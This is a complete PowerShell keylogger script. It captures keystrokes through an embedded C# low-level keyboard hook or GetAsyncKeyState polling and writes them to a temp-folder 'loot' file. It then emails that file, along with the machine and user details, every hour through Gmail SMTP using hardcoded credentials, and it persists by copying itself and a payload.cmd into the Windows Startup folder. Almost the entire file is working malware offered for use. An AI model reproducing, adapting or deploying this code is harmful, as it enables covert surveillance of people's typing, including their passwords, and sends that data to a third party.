[CmdletBinding()]
Param (
	[Parameter(Mandatory = $false)]
	[ValidateSet($True, "Startup", "TaskScheduler", "Registry", "All")]
	[string]$Type = "Startup"
)


$Email = "username@gmail.com"
$Password = "password"

$validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"


function sendMail($logFile="$env:temp\$env:username.log") {
	
    $Subject = "You got mail from $env:USERNAME!"
    $Body = @"
                This email has been sent from $env:COMPUTERNAME
                -----------------------------------------------------------------
                Computer Name: $env:computername
                User Name: $env:username
                Home Directory: $env:userprofile
                Operating System: $env:OS
                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER

"@
    if (Test-Path $logFile) {
        $Body += Get-Content -Path $logFile -Raw
    }
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
    $SMTPClient.EnableSSL = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
    $SMTPClient.Send($Email, $Email, $Subject, $Body)
}
function Check-DotNetFramework {
    $dotNetKey = 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full'
    $dotNetVersion = $null

    if (Test-Path $dotNetKey) {
        $version = (Get-ItemProperty -Path $dotNetKey -Name Release).Release
        $dotNetVersion = $version
    }

    # .NET Framework 4.0 and later versions have a release value >= 379893
    if ($dotNetVersion -ge 379893) {
		Write-Host ".NET Version: $dotNetVersion"
        return $true
    }
    
    return $false
}

function KeyLog {
	if (Check-DotNetFramework) {
		Write-Output ".NET Framework is present."
		ComplexKeyLog
	} else {
		Write-Output ".NET Framework is not present."
		SimpleKeyLog
	}
}

function ComplexKeyLog($LogFile="$env:temp\$env:username.log") {
	$LootFile = New-Item -Path $LogFile -ItemType File -Force
	$source = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
	private const int VK_RETURN = 0x0D;  // Enter key
	private const int VK_SPACE = 0x20;   // Spacebar

    private const string logFileName = "C:\\Users\\0xrand0m\\AppData\\Local\\Temp\\0xrand0m.log";
    private static StreamWriter logFile;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Main() {
      logFile = File.AppendText(logFileName);
      logFile.AutoFlush = true;

      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
		if (vkCode == VK_RETURN) {
			logFile.WriteLine();
		} else if (vkCode == VK_SPACE) {
			logFile.Write(" ");
		} else {
        	logFile.Write((Keys)vkCode);
		}
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@
Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms
[KeyLogger.Program]::Main();
}
function SimpleKeyLog($LogFile="$env:temp\$env:username.log") {
	$LootFile = New-Item -Path $LogFile -ItemType File -Force

	$APIsigs = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@
	$TypeName = "Win32_" + [guid]::NewGuid().ToString("N")
	$API = Add-Type -MemberDefinition $APIsigs -Name $TypeName -Namespace "API" -PassThru

	$LogBuilder = New-Object -TypeName System.Text.StringBuilder
	# The idea is to continuously scan each key and check whether it is pressed or not. Not the most accurate, but the simplest
	try {
		while ($true) {
			# Capture keystroke logic
			Start-Sleep -Milliseconds 80
			for ($ascii = 0; $ascii -le 254; $ascii++) {
				$KeyState = $API::GetAsyncKeyState($ascii)
				if (($KeyState -band 0x8000) -ne 0) { # Highest bit toggled means key pressed
					$hideLogBuilderOutput = $LogBuilder.Clear()
					$KeyboardState = New-Object Byte[] 256
					$storeAndHideState = $API::GetKeyboardState($KeyboardState)
					$mapKey = $API::MapVirtualKey($ascii, 3)
                    $result = $API::ToUnicode($ascii, $mapKey, $KeyboardState, $LogBuilder, $LogBuilder.Capacity, 0)

					if ($result -gt 0) {
						$character = $LogBuilder.ToString()

						if ($ascii -eq 13) { # Enter key
							Add-Content -Path $LootFile -Value "`r`n"
						} else {
						Add-Content -Path $LootFile -Value $character -NoNewline
						}
					}

				}		
			}

		}
	} 
	catch {
		Write-Error "An error occured: $_"
	}	
	finally {
		Write-Output "Finally reached: $_"
		sendMail
	}
}

function ScheduleMail($MinutesInterval=60) {
        $now = Get-Date
        $SecondsInterval = $MinutesInterval * 60
        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
		$timeLeft = ($nextInterval - $now).TotalSeconds
	
        Start-Sleep -Seconds $timeLeft
        while ($true) {
            sendMail
            Start-Sleep -Seconds $SecondsInterval
        }
}

function persistStartup() {
	
	$trigger = "payload.cmd"
	$triggerPath = "$PWD\$trigger"
	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"	
	Copy-Item -Path $triggerPath -Destination $triggerDestinationPath -Force

	$script = "keyLogger.ps1"
	$scriptPath = "$PWD\$script"
	$scriptDestinationPath = "$env:TEMP\$script"	
	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
}

function persistTaskScheduler() {
	
}

function persistRegistry() {
}

function persistAll() {
	persistStartup
	persistTaskScheduler
	persistRegistry
}


function CreatePersistance($Type) {
	
	
	switch ($Type) {
			
		"Startup" {
			# Place your specific logic for Startup here
			persistStartup
		}
		"TaskScheduler" {
			# Place your specific logic for TaskScheduler here
			persistTaskScheduler
		}
		"Registry" {
			# Place your specific logic for Registry here
			persistRegistry
		}
		"All" {
			# Place your specific logic for Registry here
			persistAll
		}
		default {
			Write-Output "Unknown option selected."
		}
	}
	
	
}


sendMail
KeyLog
CreatePersistance -Type $Type
ScheduleMail -MinutesInterval 60